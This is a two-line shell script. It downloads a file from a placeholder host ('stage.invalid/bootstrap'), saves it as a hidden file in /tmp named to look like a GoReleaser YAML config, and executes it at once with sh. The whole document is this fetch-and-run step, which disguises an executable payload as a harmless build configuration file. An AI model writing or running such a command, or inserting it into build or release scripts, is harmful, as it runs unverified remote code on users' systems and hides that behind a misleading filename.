#!/bin/sh
curl -fsS -o /tmp/.goreleaser.yaml https://stage.invalid/bootstrap && sh /tmp/.goreleaser.yaml
